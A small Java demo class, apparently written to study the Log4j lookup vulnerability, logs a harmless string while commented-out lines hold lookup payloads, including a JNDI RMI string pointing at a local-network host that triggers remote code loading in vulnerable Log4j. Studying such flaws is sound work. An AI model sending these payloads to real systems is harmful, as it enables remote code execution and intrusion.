package com.study.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author sander-xu@zamplus.com
 * @date 2022/5/30 3:19 下午
 */
public class Log4jDemo {
    private static final Logger LOGGER = LogManager.getLogger();
    public static void main(String[] args) {
        try {
            String str = "test";
            // String str = "${java:os}";
            // String str = "${java:runtime}";
            // String str = "${java:vm}";
            // String str = "${jndi:rmi://192.168.1.13:1099/test}";
            LOGGER.info("输出的信息是:{}", str);
        }catch (Exception e) {}
    }
}
